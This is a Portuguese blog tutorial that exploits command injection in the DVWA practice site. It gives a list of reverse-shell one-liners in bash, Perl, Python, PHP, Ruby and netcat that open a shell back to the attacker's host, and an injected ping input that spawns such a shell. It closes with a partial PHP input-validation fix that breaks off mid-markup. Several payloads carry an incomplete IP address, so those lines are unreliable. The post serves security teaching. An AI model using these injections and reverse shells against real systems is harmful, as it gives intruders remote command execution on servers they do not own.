---
layout: post
title: Vulnerabilidade de execução de códigos em sites (DVWA)
date: '2018-04-16T06:11:00.001-07:00'
author: Israel Helton Wernik
tags: 
modified_time: '2018-11-16T00:10:36.101-08:00'
thumbnail: https://1.bp.blogspot.com/-sLhrSa0Ukis/WtShESJI0tI/AAAAAAAAAHI/0B40zJmaJm4592bBXUyixDzdo_rz14PNQCLcBGAs/s72-c/code%2Bvulnerability.jpg
blogger_id: tag:blogger.com,1999:blog-5213248075369348047.post-3595045474717695171
blogger_orig_url: https://cibersegurancawernik.blogspot.com/2018/04/vulnerabilidade-de-execucao-de-codigos.html
---

<div dir="ltr" style="line-height: 1.38; margin-bottom: 3pt; margin-top: 0pt;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-sLhrSa0Ukis/WtShESJI0tI/AAAAAAAAAHI/0B40zJmaJm4592bBXUyixDzdo_rz14PNQCLcBGAs/s1600/code%2Bvulnerability.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="260" data-original-width="400" height="208" src="https://1.bp.blogspot.com/-sLhrSa0Ukis/WtShESJI0tI/AAAAAAAAAHI/0B40zJmaJm4592bBXUyixDzdo_rz14PNQCLcBGAs/s320/code%2Bvulnerability.jpg" width="320" /></a></div><span id="docs-internal-guid-ee34362d-ce92-a7a2-a64e-4dd02d8f5904"><br /></span><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Nesse artigo pretendo demonstrar como funciona uma famosa vulnerabilidade que hackers podem utilizar para executar codigos em um site. Farei uma demonstração com o site DVWA para entedermos como essa vulnerabilidade pode ser utilizada e trarei como evitar. </span><br /><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br /></span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Podemos utilizar um comando para controlar o site, por exemplo nesse site temos um local em que podemos fazer o comando para fazer ping em qualquer local.</span></div><br /><a name='more'></a><br /><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">No linux podemos utilizar ; para executar dois comandos </span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">vamos testar e fazer o ping e ;pwd</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">com o Site DVWA em low security</span></div><br /><div dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #333333; padding: 5pt; vertical-align: top;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">ping 10.20.14.203 ;pwd</span></div></td></tr></tbody></table></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="240" src="https://lh3.googleusercontent.com/Gm417meYcTIFfJJ0p7nV_rDm55fXYhIyLR63ib3nQoXJQDTkLv8E86F0txzGw-w0wXX4RhO-r9epjmFpeNoSCNe_4ntVZkFYPZFs1iIQ-noSVQ3_9-sUvbDIG_YDcfNoLRXB74yp" style="border: none; transform: rotate(0rad);" width="570" /></span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Podemos ver que foi feito o ping e também rodou o comando pwd, achamos a vulnerabilidade.</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Agora vamos explorar essa vulnerabilidade </span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Lista de comandos para conseguir reverse connection com o computador alvo.</span></div><br /><br /><div dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #f8f8f8; padding: 5pt; vertical-align: top;"><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">#Os exemplos abaixo assumem que o Hacker tenha o IP is 10.20.14 e usa a #porta 8080 para conexão.</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">#De qualquer forma, precisa ouvir a porta 8080 Usando o seguinte comando</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">nc -vv -l -p 8080</span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">B</span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">ASH</span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">bash -i &gt;&amp; /dev/tcp/10.20.14.203/8080 0&gt;&amp;1</span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">PERL</span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">Python</span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">PHP</span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">php -r '$sock=fsockopen("10.20.14",8080);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">Ruby</span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">Netcat</span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">nc -e /bin/sh 10.20.14 8080</span><span style="font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span></div></td></tr></tbody></table></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Vamos usar o Netcat para ouvir e conectar com outro computador, em nosso computador digitamos</span></div><br /><div dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #333333; padding: 5pt; vertical-align: top;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">nc -vv -l -p 8080</span></div></td></tr></tbody></table></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">nc = netcat</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">- vv = ver se há algo errado</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">-l = listen</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">-p = port</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="33" src="https://lh6.googleusercontent.com/pxzReOMc_QBT1pgbNOTRjNHYI9NuEOpUmdLTPgwX5WfZGX6RyzSbQgJnlaG7XS_a32ZxEKAUXlxs52Xdd8SLFvh13yKBuRVTnLr12aBYUg0rhFAdDZnAk5eQYIkpRLDmV6RPYQK4" style="border: none; transform: rotate(0rad);" width="280" /></span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Agora vamos conectar pelo webserver, assumimos que ele tenha Netcat, e rodamos o comando de Netcat após a solicitação de Ping</span></div><br /><div dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #333333; padding: 5pt; vertical-align: top;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">10.20.14.203; nc -e /bin/sh 10.20.14.203 8080</span></div></td></tr></tbody></table></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Voltando ao Kali, vemos que recebemos a conexão </span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="193" src="https://lh4.googleusercontent.com/_xAgx92grqAOWPYASbNgXAzXAhbEimIW11gmplH3aVzAbXsW9vIoRNvxdeopQskVS9i-VUNWAoKsUv0A4X6ngMTAzTpMLcgHVC-3HqsCfhuRJAzl9phiv7eI07ns67dhLHsKGGYo" style="border: none; transform: rotate(0rad);" width="602" /></span></div><br /><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><span style="font-family: &quot;arial&quot;; font-size: 20pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Aumentando a dificuldade para mais dificil</span></h1><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">No exemplo passado fizemos a utilização do comando ; que roda os dois comandos </span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Agora vamos testar com o comando | que roda apenas um comando </span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="216" src="https://lh6.googleusercontent.com/w-afZ6cVTiJzhBYTTUa3zdXeefJQwKZfOrmTfSMmXHn7KLoTzIOFR07Jnw3K-O5oqEWs0CwLf6H08GMZ9hUzbFC0R75adb-MwC7VFVynZ0aou0HB0gAW_8rMHnJRyII37_CX1LVJ" style="border: none; transform: rotate(0rad);" width="402" /></span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Vamos testar:</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="207" src="https://lh4.googleusercontent.com/TjDXBZsvyh5DuO0ApUDJXVDeh9nqsfqXBI5cXWiQh0jtbYSX5T79W252XA1375MrH3EirdUkCKg5Kco-uZiUrUmAZG-UtfhWxW3VWW3f1IBrxELpyUO_9OvCTXK4RVSOBwxcesLm" style="border: none; transform: rotate(0rad);" width="602" /></span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Funcionou :)</span></div><br /><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><span style="font-family: &quot;arial&quot;; font-size: 20pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Segurança </span></h1><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Para resolver esse problema devemos arrumar no código do site impossibilitando-o de enviar algum comando</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Pode se utilizar um Regex para que o Input seja somente o que queremos </span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Usar a função </span><span style="background-color: #333333; color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">explode()</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">e verificar se todos os resultados são números</span></div><br /><div dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #333333; padding: 5pt; vertical-align: top;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #fc9b9b; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&lt;?php</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: #fcc28c; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">if</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">( </span><span style="color: #fcc28c; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">isset</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">( $_POST[ </span><span style="color: #a2fca2; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">'Submit'</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> ] &nbsp;) ) {</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: #888888; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">// Check Anti-CSRF token</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">checkToken( $_REQUEST[ </span><span style="color: #a2fca2; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">'user_token'</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> ], $_SESSION[ </span><span style="color: #a2fca2; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">'session_token'</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> ], </span><span style="color: #a2fca2; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">'index.php'</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> );</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: #888888; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">// Get input</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">$target = $_REQUEST[ </span><span style="color: #a2fca2; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">'ip'</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> ];</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">$target = stripslashes( $target );</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: #888888; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">// Split the IP into 4 octects</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">$octet = explode( </span><span style="color: #a2fca2; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">"."</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">, $target );</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: #888888; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">// Check IF each octet is an integer</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: #fcc28c; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">if</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">( ( is_numeric( $octet[</span><span style="color: #d36363; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">0</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">] ) ) &amp;&amp; ( is_numeric( $octet[</span><span style="color: #d36363; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">1</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">] ) ) &amp;&amp; ( is_numeric( $octet[</span><span style="color: #d36363; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">2</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">] ) ) &amp;&amp; ( is_numeric( $octet[</span><span style="color: #d36363; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">3</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">] ) ) &amp;&amp; ( sizeof( $octet ) == </span><span style="color: #d36363; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">4</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> ) ) {</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: #888888; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">// If all 4 octets are int's put the IP back together.</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">$target = $octet[</span><span style="color: #d36363; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">0</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">] . </span><span style="color: #a2fca2; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">'.'</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> . $octet[</span><span style="color: #d36363; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">1</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">] . </span><span style="color: #a2fca2; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">'.'</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> . $octet[</span><span style="color: #d36363; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">2</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">] . </span><span style="color: #a2fca2; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">'.'</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> . $octet[</span><span style="color: #d36363; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">3</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">];</span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br class="kix-line-break" /></span><span style="color: white; font-family: &quot;consolas&quot;; font-size: 11pt; 